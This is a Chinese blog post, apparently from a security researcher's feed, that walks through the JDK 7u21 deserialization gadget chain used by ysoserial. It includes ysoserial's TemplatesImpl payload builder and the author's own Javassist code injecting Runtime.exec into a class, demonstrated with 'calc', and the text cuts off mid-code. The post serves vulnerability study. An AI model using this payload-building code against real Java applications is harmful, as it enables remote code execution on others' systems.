    <updated>2019-12-12T08:07:39.560Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JDK反序列化Gadgets-7u21"><a href="#JDK反序列化Gadgets-7u21" class="headerlink" title="JDK反序列化Gadgets 7u21"></a>JDK反序列化Gadgets 7u21</h2><p>预计阅读时间：30-60分钟<br>内容：具详细无比</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从fastjson1.24版本的反序列化利用方式知道有使用jdk7u21的版本利用链，ysoserial利用工具中也有7u21利用链。现在都是7u80版本了，这个漏洞真正直接利用，估计已经很难找到了。</p><p>但是这个利用链的构造有很多之前没接触过的java特性，就此好好学习一下，也算是fastjson的前置知识吧。</p><blockquote><p>Gadgets 是啥意思？<br>其实就是利用链的意思</p></blockquote><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>先去Oracle官网下载<a href="https://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html" target="_blank" rel="noopener">漏洞jdk版本7u21</a>，漏洞影响7u25之前的版本，整条链poc貌似只适用于7u21以前。</p><p>之所以说这是JDK反序列化链，是因为这个链中所有利用类都是jdk自带的类，其中payload最终关键类是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类</code>。</p><p>我们从ysoserial源码中抠出7u21的利用代码来分析，具体代码由于比较长，不全部在此贴出，只截取需要的部分，所有代码已上传<a href="https://github.com/lalajun/jdk7u21" target="_blank" rel="noopener">github</a>。</p><p><code>jdk7u21.java</code>是一个包含基础核心原理POC。（Gadgets类参考github，或者可以去ysoserial中取）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">       TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(<span class="string">"calc"</span>);<span class="comment">//生成恶意的calc</span></span><br><span class="line">       calc.getOutputProperties();<span class="comment">//调用getOutputProperties就可以执行calc</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><blockquote><p>请注意TemplatesImpl类的getOutputProperties函数是一个以get开头的函数，这是这个利用链在fastjson组件利用的关键。</p></blockquote><p>跟踪getOutputProperties方法，来确认恶意TemplatesImpl类calc 需要的条件，先看调用栈：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9wr99ulj30yp075aat.jpg" alt="调用栈1.png"></p><h3 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h3><p>从调用栈中，可见最后是<code>obj.newInstance</code>（obj是虚指）触发poc执行恶意代码，调用栈再往下之后就是java class类的newInsatance内部实现了，不细纠。</p><p>newinstance实例化会默认触发执行static方法，构造方法代码，如下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9x8pbn7j31pt0n040u.jpg" alt="newInstance.png"></p><p>所以我们的payload需要放在最后执行的恶意类的static或构造方法中。知道这点后，我们从头开始慢慢寻找其他需要条件。</p><p>跟入<code>TemplatesImpl类</code>的<code>getOutputProperties方法</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();<span class="comment">//我们进入newTransformer方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer方法</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);<span class="comment">//此处没有啥限制条件，进入getTransletInstance()</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">            transformer.setURIResolver(_uriResolver);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">            transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//限制条件1：TemplatesImpl类中的_name变量！=null</span></span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">   <span class="comment">//限制条件2：TemplatesImpl类中的_class变量==null</span></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();<span class="comment">//进入此处，查看其他限制条件</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 漏洞触发代码就是下面这一行，_transletIndex是在defineTransletClasses()中赋值的，其实就是选取了一个特定条件的class获取它的实例。</span></span><br><span class="line">            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            ...<span class="comment">//这里之后的代码不重要，省略</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在漏洞代码执行<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>前，</p><p>先经过<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"><span class="comment">//限制条件3：TemplatesImpl类中的_bytecodes变量！=null</span></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//引入加载器</span></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> </span><br><span class="line"> <span class="comment">//限制条件4：TemplatesImpl类中的_tfactory变量需要有一个getExternalExtensionsMap方法</span></span><br><span class="line">        <span class="comment">//           即需要是一个TransformerFactoryImpl类</span></span><br><span class="line">   TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//以下主要做的事情是通过加载器从_bytecodes中加载类至_class。（bytecodes可以是一个数组转换为一个数组class）</span></span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                <span class="comment">//转化。ClassLoader.defineClass() 会转载javabyte变为class类，但是不会执行static代码。</span></span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="comment">//获取转过来的class的父类</span></span><br><span class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 对于读取进来的class的父类进行限制，满足条件才改变_transletIndex的值</span></span><br><span class="line"> <span class="comment">// 之后将获取class[_transletIndex]的实例</span></span><br><span class="line"> <span class="comment">// ABSTRACT_TRANSLET="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";</span></span><br><span class="line"> <span class="comment">// 限制条件5：_bytecodes的类必须是ABSTRACT_TRANSLET的子类</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="tfactory-与jdk版本"><a href="#tfactory-与jdk版本" class="headerlink" title="_tfactory 与jdk版本"></a>_tfactory 与jdk版本</h3><p>其中的限制条件4 _tfactory 这个参数是有说法的，在其他人博客中有存在对于 _tfactory 的参数的说明：</p><blockquote><p>因为代码中存在  <code>_tfactory.getExternalExtensionsMap()</code> 所以需要 _tfactory 进行赋值 不能为null。</p></blockquote><p>但其实这跟jdk版本是有关的，1.7下不同的jdk版本这段代码是不同的。</p><p>1.7u80版本的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</code>中就是存在<code>_tfactory.getExternalExtensionsMap()</code>这句代码的。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9qsg3wij31z017owp4.jpg" alt="7u80的_tfactory.png"></p><p>在1.7u80中，注释Gadgets类中添加 <code>_tfactory</code>这个字段的代码后（之后我们将详细分析Gadgets类），_tfactory=null就会发生null指针报错。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9qjqzp0j31pj0yg78q.jpg" alt="7u80报错.png"></p><blockquote><p>细心的同学可以注意到上面jdk1.7u80两个弹框成功不成功的下方都会null指针报错。</p><p>但是前者是在执行恶意代码AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();后<br>的translet.postInitialization();处报错。</p><p>而后者是在恶意代码执行之前的defineTransletClasses函数报错。即没有成功执行payload</p></blockquote><p>在同样注释<code>_tfactory</code>这个字段的代码的情况下，使用jdk1.7u21的环境，却可以成功执行，因为jdk1.7u21的情况下并没有<code>_tfactory.getExternalExtensionsMap()</code>这句代码。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9p99qusj31sd15pgxk.jpg" alt="7u21的_tfactory.png"></p><p>但是1.7u21也可以兼容给_tfactory赋值的情况，所以还是给 _tfactory 赋值比较好，可以兼容不同的版本。</p><h3 id="TemplatesImpl恶意类的限制条件"><a href="#TemplatesImpl恶意类的限制条件" class="headerlink" title="TemplatesImpl恶意类的限制条件"></a>TemplatesImpl恶意类的限制条件</h3><p>至此总结我们构筑一个恶意的TemplatesImpl类，在调用这个恶意类的getOutputProperties方法时，需要满足的限制条件。即，构筑恶意TemplatesImpl类的需要条件。</p><ol><li>TemplatesImpl类的 <code>_name</code> 变量 != null</li><li>TemplatesImpl类的<code>_class</code>变量 == null</li><li>TemplatesImpl类的 <code>_bytecodes</code> 变量 != null</li><li>TemplatesImpl类的<code>_tfactory</code>需要是一个拥有getExternalExtensionsMap()方法的类，使用jdk自带的TransformerFactoryImpl类</li><li>TemplatesImpl类的<code>_bytecodes</code>是我们代码执行的类的字节码。<code>_bytecodes</code>中的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类</li><li>我们需要执行的恶意代码写在<code>_bytecodes</code> 变量对应的类的静态方法或构造方法中。</li></ol><h2 id="构筑POC"><a href="#构筑POC" class="headerlink" title="构筑POC"></a>构筑POC</h2><p>回首漏洞原理的POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(<span class="string">"calc"</span>);<span class="comment">//生成恶意的calc</span></span><br><span class="line">    calc.getOutputProperties();<span class="comment">//调用getOutputProperties就可以执行calc</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在分析完第二句触发漏洞的语句后。回来看第一句构筑。由于需要动态对于类结构进行操作，有使用到<a href="https://www.cnblogs.com/rickiyang/p/11336268.html" target="_blank" rel="noopener">Javassist包</a></p><p>Gadgets是ysoserial自主构建的一个利用类，看其中的createTemplatesImpl方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">createTemplatesImpl</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.使用一个自定义的满足条件的恶意模板类StubTransletPayload</span></span><br><span class="line">    <span class="comment">// 满足条件5：恶意类继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet。</span></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();<span class="comment">//Javassist包中建立一个容器</span></span><br><span class="line">    <span class="comment">//添加自定义的恶意模板类StubTransletPayload的路径至容器的Classpath</span></span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload.class));</span><br><span class="line">    <span class="comment">//从Classpath中寻找自定义的恶意模板类StubTransletPayload，引入它，之后对它进行修改</span></span><br><span class="line">    <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    <span class="comment">// 2.在自定义恶意类中添加静态模块，一句Rumtime.exec，命令从外部引入</span></span><br><span class="line">    <span class="comment">// 满足条件6：需要执行的恶意代码写在类的静态方法或构造方法中。</span></span><br><span class="line">    clazz.makeClassInitializer()</span><br><span class="line">            .insertAfter(<span class="string">"java.lang.Runtime.getRuntime().exec(\""</span></span><br><span class="line">                    + command.replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>)</span><br><span class="line">                    + <span class="string">"\");"</span>);</span><br><span class="line">    <span class="comment">// 3.设置一个唯一性的class名称</span></span><br><span class="line">    clazz.setName(<span class="string">"ysoserial.Pwner"</span> + System.nanoTime());</span><br><span class="line"><span class="comment">// 4. 把我们的自定义的恶意类转化成byte数组模式</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 添加byte数组classBytes至_bytecodes字段，再添加一个另外准备的Foo类的字节（目前来看是多余的）</span></span><br><span class="line">    <span class="comment">// 满足条件3：TemplatesImpl类的 `_bytecodes` 变量 != null</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">            classBytes,</span><br><span class="line">            ClassFiles.classAsBytes(Foo.class)&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 满足条件1：TemplatesImpl类的 `_name` 变量 != null</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"Pwnr"</span>);</span><br><span class="line">    <span class="comment">// 6. 满足条件4：使TemplatesImpl类的_tfactory是一个拥有getExternalExtensionsMap()方法的类</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">    <span class="comment">// 没有设置_class，满足条件2：TemplatesImpl类的`_class`变量 == null</span></span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>瞅一眼<code>StubTransletPayload</code>类的继承。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//很优秀的按照要求继承了AbstractTranslet类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"><span class="comment">//以下看似是多余的，实际上是继承AbstractTranslet的必要，不然会报错。</span></span><br><span class="line"><span class="comment">//transform(DOM document, SerializationHandler[] handlers) 需要实现 AbstractTranslet 的一个虚拟类</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"><span class="comment">//下面这个函数 需要实现AbstractTranslet类对应的Translet接口的一个接口</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再瞅一眼往templates类的私有字段_bytecodes， _name ， _tfactory 这些属性中塞数据的<code>Reflections.setFieldValue</code>方法。这里是通过<strong>反射机制</strong>修改私有属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);<span class="comment">//获取了对应的字段后，进行赋值。</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//Reflections#getField</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = clazz.getDeclaredField(fieldName);<span class="comment">//通过反射机制获取该字段</span></span><br><span class="line">        <span class="keyword">if</span> (field != <span class="keyword">null</span>)</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);<span class="comment">//接触private限制</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">            <span class="comment">//判断父类，如果有父类，就获取父类的值，TemplatesImpl类没有父类，这里没用上。</span></span><br><span class="line">            field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到上面的Gadgets类完美符合了我们之前在利用过程中提到的全部需要条件。但是Gadgets构造的恶意TemplatesImpl类比起我们需要的POC条件多1处东西：</p><ol><li>_bytecodes多加了一个Foo.class类</li></ol><p>我始终没有找到这个到底有啥用，去掉后实验，没有任何影响。如果有老哥知道，可以联系我，非常感谢。</p><h3 id="payload位置static与构造函数"><a href="#payload位置static与构造函数" class="headerlink" title="payload位置static与构造函数"></a>payload位置static与构造函数</h3><p>自己构造一波payload，再分析一个payload放置位置的问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdk7u21_mine</span> </span>&#123;</span><br><span class="line">    <span class="comment">//从lala这个类中提取我们命令执行的字节码</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">lala</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//步骤一 TemplatesImpl类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.get(lala.class.getName());</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">        <span class="comment">//之前说的静态方法和构造方法均可，这边试一下构造方法</span></span><br><span class="line">        <span class="comment">//cc.makeClassInitializer().insertBefore(cmd);</span></span><br><span class="line">        <span class="comment">//这样可以直接添加构造函数</span></span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);</span><br><span class="line">        cons.setBody(<span class="string">"&#123;"</span>+cmd+<span class="string">"&#125;"</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line">        <span class="comment">//设置不重复的类名</span></span><br><span class="line">        String randomClassName = <span class="string">"LaLa"</span>+System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//设置满足条件的父类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line">        <span class="comment">//获取字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] lalaByteCodes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span 